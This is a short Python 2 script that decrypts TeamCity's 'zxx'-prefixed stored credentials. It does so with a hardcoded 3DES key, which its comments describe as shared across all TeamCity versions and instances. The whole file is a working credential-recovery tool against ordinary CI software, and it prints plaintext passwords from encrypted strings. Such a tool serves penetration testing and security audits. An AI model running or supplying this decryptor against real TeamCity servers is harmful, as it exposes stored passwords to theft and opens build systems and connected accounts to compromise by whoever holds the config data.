#!/usr/bin/env python

import Crypto.Cipher.DES3 as DES3
import binascii
import sys

def usage():
    print "./teamcity-secret-decrypt.py <credential string>"
    print "ex: ./teamcity-secret-decrypt.py zxxb1b64ad3319d8d0ba7e5744b9e50a0fb"
    exit()


def main():
    if len(sys.argv) != 2:
        usage()

    # Hardcoded decryption key - should be the same for all version and instances of TeamCity for the last few years at least.
    key = binascii.unhexlify("3d160b396e59ecff00636f883704f70a0b2d47a7159d3633")

    decryptor = DES3.new(key, DES3.MODE_ECB)

    # Check input string
    encdata = sys.argv[1]
    if (encdata[:3] != "zxx"):
        print "Invalid encrypted credential format.  Example encrypted credential: zxxb1b64ad3319d8d0ba7e5744b9e50a0fb"
        exit()

    encdata = encdata[3:]
    encdatabinary = binascii.unhexlify(encdata)

    # Decrypt (PKCS5 padding isn't accounted for, seems like it's easy enough to spot at the end of output and ignore though!)
    out = decryptor.decrypt(encdatabinary)

    print out


if __name__ == '__main__':
    main()
